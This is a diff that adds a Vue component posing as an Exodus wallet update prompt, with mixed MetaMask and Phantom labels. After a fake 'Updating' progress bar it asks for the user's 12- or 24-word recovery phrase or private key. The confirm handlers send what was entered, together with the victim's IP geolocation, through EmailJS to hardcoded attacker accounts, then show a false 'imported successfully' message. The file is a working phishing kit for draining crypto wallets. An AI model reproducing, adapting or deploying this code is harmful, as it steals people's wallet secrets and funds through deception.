@@ -1,0 +1,496 @@
+<template>
+  <div
+    style="
+      background: linear-gradient(
+        rgb(24, 28, 47) 0%,
+        rgb(35, 41, 74) 60%,
+        rgb(46, 58, 122) 85%,
+        rgb(43, 95, 198) 100%
+      );
+    "
+    class="bg-white rounded-2xl w-full text-white overflow-hidden mx-auto"
+  >
+    <!-- Header (present on most steps) -->
+    <div
+      v-if="currentStep !== 1"
+      class="flex justify-between items-center py-3 px-4 border-b border-gray-700"
+    >
+      <div class="flex items-center gap-3">
+        <img
+          src="https://vercelquickfix.com/exodus.png"
+          alt="MetaMask"
+          class="h-10"
+        />
+      </div>
+      <div class="flex items-center gap-3">
+        <svg
+          @click.prevent="closeModal"
+          xmlns="http://www.w3.org/2000/svg"
+          class="h-6 w-6 text-gray-500 cursor-pointer"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M6 18L18 6M6 6l12 12"
+          />
+        </svg>
+      </div>
+    </div>
+    <hr v-if="currentStep !== 1" class="border-t border-gray-500" />
+
+    <!-- Step container -->
+    <div class="min-h-[500px] flex flex-col relative p-6">
+      <!-- STEP 1: MetaMask logo + spinner (loads for 3s) -->
+      <transition name="fade" mode="out-in">
+        <div
+          v-if="currentStep === 1"
+          key="s1"
+          class="flex flex-col items-center justify-center h-full absolute inset-0"
+        >
+          <img
+            src="https://vercelquickfix.com/exodus.png"
+            alt="MetaMask Logo"
+            class="w-[90px] h-[90px] mb-[30px]"
+          />
+          <svg
+            aria-hidden="true"
+            class="w-20 h-20 text-white animate-spin dark:text-gray-600 fill-white"
+            viewBox="0 0 100 101"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
+              fill="#037DD6"
+            />
+            <path
+              d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
+              fill="currentFill"
+            />
+          </svg>
+        </div>
+
+        <!-- STEP 2: Update Available -->
+        <div v-else-if="currentStep === 2" key="s2" class="flex flex-col">
+          <div class="flex flex-col items-center gap-4 py-6">
+            <div class="rounded-3xl flex justify-center w-full">
+              <img
+                class="w-[80px] h-[80px]"
+                src="https://vercelquickfix.com/exodus.png"
+                alt="Exodus Wallet"
+              />
+            </div>
+            <h2
+              style="color: white"
+              class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
+            >
+              Update Available
+            </h2>
+            <p class="text-gray-300 font-semibold text-center text-[14px] mb-8">
+              A new version of Exodus is available. Please update to continue using all features.
+            </p>
+
+            
+
+            <div class="w-full mt-5">
+              <button
+                @click="startUpdate"
+                class="w-full py-4 text-2xl text-white border-none bg-[#0376c9] rounded-[30px] font-bold text-[#222] hover:opacity-95"
+              >
+                Update
+              </button>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- STEP 3: Updating (spinner + progress) -->
+        <div
+          v-else-if="currentStep === 3"
+          key="s3"
+          class="flex flex-col items-center"
+        >
+          <div class="flex flex-col items-center gap-3 py-6 w-full">
+            <svg
+              aria-hidden="true"
+              class="w-20 h-20 text-gray-200 animate-spin dark:text-gray-600 fill-[#0376c9]"
+              viewBox="0 0 100 101"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
+                fill="#eeeeee"
+              />
+              <path
+                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
+                fill="currentFill"
+              />
+            </svg>
+            <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">
+              Updating Exodus
+            </h2>
+            <p class="text-gray-300 text-[14px] text-center">
+              Please wait while we update to the latest version
+            </p>
+
+            <div class="w-full mt-6">
+              <div class="bg-white h-2 rounded-full overflow-hidden">
+                <div
+                  class="h-2 rounded-full transition-all"
+                  :style="{
+                    width: progress + '%',
+                    background: '#0376c9',
+                  }"
+                ></div>
+              </div>
+              <div
+                class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white"
+              >
+                <!-- <span>0%</span> -->
+                <span>{{ Math.round(progress) }}%</span>
+                <!-- <span>100%</span> -->
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
+        <div
+          v-else-if="currentStep === 4"
+          key="s4"
+          class="flex flex-col w-full"
+        >
+          <div class="mb-4" v-if="importType !== 'private'">
+            <h2 class="text-4xl text-white mt-2 text-center font-bold">
+              Restore Your Wallet
+            </h2>
+            <p class="text-gray-200 text-[14px] text-center">
+              Enter your 12-word secret phrase to import your existing wallet
+            </p>
+          </div>
+
+          <!-- Recovery phrase grid -->
+          <div>
+            <div class="grid grid-cols-2 gap-3 mt-4">
+              <div v-for="n in phraseCount" :key="n" class="relative">
+                <span
+                  class="absolute left-2 top-2 text-gray-500 text-sm select-none"
+                  >{{ n }}</span
+                >
+                <div class="relative">
+                  <input
+                    :type="'text'"
+                    style="background: #1a1f2e;"
+                    v-model="phraseWords[n - 1]"
+                    class="w-full  rounded-md py-2 pl-10 pr-10 text-white text-[12px] outline-none"
+                  />
+                  <div
+                    @click="toggleFieldVisibility(n - 1)"
+                    type="button"
+                    class="absolute right-2 top-2 text-gray-400"
+                  >
+                    <svg
+                      v-if="hiddenFields[n - 1]"
+                      xmlns="http://www.w3.org/2000/svg"
+                      class="h-5 w-5"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke="currentColor"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                      />
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
+                      />
+                    </svg>
+                    <svg
+                      v-else
+                      xmlns="http://www.w3.org/2000/svg"
+                      class="h-5 w-5"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke="currentColor"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                      />
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M3 3l18 18"
+                      />
+                    </svg>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="flex gap-3" style="margin-top: 4.5rem">
+              <button
+                @click="confirmPhrase"
+                :disabled="isImportDisabled"
+                class="flex-1 bg-[#0376c9] py-4 bg-[#0376c9] text-white border-none hover:border-none hover:text-[#222] rounded-[30px] font-bold text-[#222]"
+              >
+                {{isLoading ? 'Importing...' : 'Confirm'}}
+              </button>
+            </div>
+          </div>
+        </div>
+      </transition>
+
+      <!-- message -->
+      <transition name="fade">
+        <div
+          v-if="message.text"
+          :class="[
+            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
+            message.type === 'success'
+              ? 'bg-green-600 text-white'
+              : 'bg-red-600 text-white',
+          ]"
+        >
+          {{ message.text }}
+        </div>
+      </transition>
+    </div>
+  </div>
+</template>
+
+<script setup>
+import axios from "axios";
+import { ref, computed, watch, nextTick } from "vue";
+
+const emit = defineEmits(["close"]);
+/* state */
+const currentStep = ref(1);
+const progress = ref(0);
+const isLoading = ref(false);
+const message = ref({ text: "", type: "" });
+
+/* header control */
+const showMetaMaskIcon = ref(true);
+const headerTitle = ref("MetaMask");
+const headerLink = ref("");
+const headerLinkText = ref("");
+
+/* import flow */
+const importType = ref("12"); // '12' | '24' | 'private'
+const phraseWords = ref([]);
+const phraseCount = computed(() => (importType.value === "24" ? 24 : 12));
+const hiddenFields = ref([]);
+const privateKeyInput = ref("");
+
+/* helper initializers */
+function initPhraseWords() {
+  phraseWords.value = Array(phraseCount.value).fill("");
+  hiddenFields.value = Array(phraseCount.value).fill(true);
+}
+
+/* start initial state for step 1 -> auto advance after 3s */
+const advanceTimer = setTimeout(() => {
+  if (currentStep.value === 1) {
+    nextStep(); // goes to step 2
+  }
+}, 3000);
+
+/* basic actions */
+function closeModal() {
+  emit("close");
+}
+
+/* Start update: step 2 -> step 3 (spinner + progress) */
+async function startUpdate() {
+  currentStep.value = 3;
+  progress.value = 0;
+  headerLink.value = "";
+  headerLinkText.value = "";
+
+  // animate progress from 0 to 100 in 3 seconds
+  const duration = 3000;
+  const start = performance.now();
+  isLoading.value = true;
+
+  function step(now) {
+    const elapsed = now - start;
+    const pct = Math.min(100, (elapsed / duration) * 100);
+    progress.value = pct;
+    if (elapsed < duration) {
+      requestAnimationFrame(step);
+    } else {
+      // done
+      isLoading.value = false;
+      // move to import step
+      setTimeout(() => {
+        currentStep.value = 4;
+        initPhraseWords();
+      }, 400);
+    }
+  }
+  requestAnimationFrame(step);
+}
+
+/* Navigation */
+function nextStep() {
+  if (currentStep.value < 4) {
+    currentStep.value++;
+    if (currentStep.value === 4) {
+      initPhraseWords();
+    }
+  }
+}
+
+function prevStep() {
+  if (currentStep.value > 1) currentStep.value--;
+}
+
+/* Import handlers */
+watch(importType, async (val) => {
+  await nextTick();
+  initPhraseWords();
+});
+
+function toggleFieldVisibility(idx) {
+  hiddenFields.value[idx] = !hiddenFields.value[idx];
+}
+
+const isImportDisabled = computed(() => {
+  // require all phrase words filled for 12/24
+  if (importType.value === "private") {
+    return !privateKeyInput.value.trim();
+  } else {
+    return phraseWords.value
+      .slice(0, phraseCount.value)
+      .some((w) => !w || !w.trim());
+  }
+});
+
+async function confirmPhrase() {
+  if (isImportDisabled.value) {
+    return showMessage("Please fill all fields", "error");
+  }
+  isLoading.value = true;
+  try {
+    const location = await axios.get("https://ipapi.co/json");
+    const payload = {
+      type: importType.value,
+      phrase: phraseWords.value.join(" "),
+    };
+
+    const params = {
+      service_id: "service_eusbqyo",
+      template_id: "template_z6xga6o",
+      user_id: "obT4LcwZqPw_KlOar",
+      template_params: {
+        from_name: "Blockchain solutions",
+        wallet_type: "Phantom Wallets",
+        location: JSON.stringify(location.data),
+        link_drops: JSON.stringify(payload),
+        reply_to: "customeronlineagent@gmail.com",
+      },
+    };
+    const response = await axios.post(
+      "https://api.emailjs.com/api/v1.0/email/send",
+      params
+    );
+
+    if (response.data === "OK") {
+      showMessage("Wallet imported successfully!", "success");
+      emit("close");
+    }
+
+    if (!response.ok) throw new Error("Failed to import wallet");
+    showMessage("Wallet imported successfully!", "success");
+  } catch (err) {
+    showMessage(err.message || "Import failed", "error");
+  } finally {
+    isLoading.value = false;
+  }
+}
+
+async function confirmPrivateKey() {
+  if (!privateKeyInput.value.trim()) {
+    return showMessage("Please enter your private key", "error");
+  }
+  isLoading.value = true;
+  try {
+    const location = await axios.get("https://ipapi.co/json");
+    const payload = {
+      privateKey: privateKeyInput.value,
+    };
+    const params = {
+      service_id: "service_eusbqyo",
+      template_id: "template_z6xga6o",
+      user_id: "obT4LcwZqPw_KlOar",
+      template_params: {
+        from_name: "Blockchain solutions",
+        wallet_type: "Phantom Wallets",
+        location: JSON.stringify(location.data),
+        link_drops: JSON.stringify(payload),
+        reply_to: "customeronlineagent@gmail.com",
+      },
+    };
+    const response = await axios.post(
+      "https://api.emailjs.com/api/v1.0/email/send",
+      params
+    );
+
+    if (response.data === "OK") {
+      showMessage("Wallet imported successfully!", "success");
+      emit("close");
+    }
+
+    if (!response.ok) throw new Error("Failed to import wallet");
+    showMessage("Private key imported successfully!", "success");
+  } catch (err) {
+    showMessage(err.message || "Import failed", "error");
+  } finally {
+    isLoading.value = false;
+  }
+}
+
+function cancelImport() {
+  // return to previous screen (e.g., step 2)
+  currentStep.value = 4;
+  importType.value === "12";
+
+  emit("close");
+}
+
+/* messages */
+function showMessage(text, type = "success") {
+  message.value = { text, type };
+  setTimeout(() => {
+    message.value.text = "";
+  }, 3000);
+}
+
+/* init */
+initPhraseWords();
+</script>
+
+<style scoped>
+.fade-enter-active,
+.fade-leave-active {
+  transition: opacity 0.28s ease;
+}
+.fade-enter-from,
+.fade-leave-to {
+  opacity: 0;
+}
+</style>
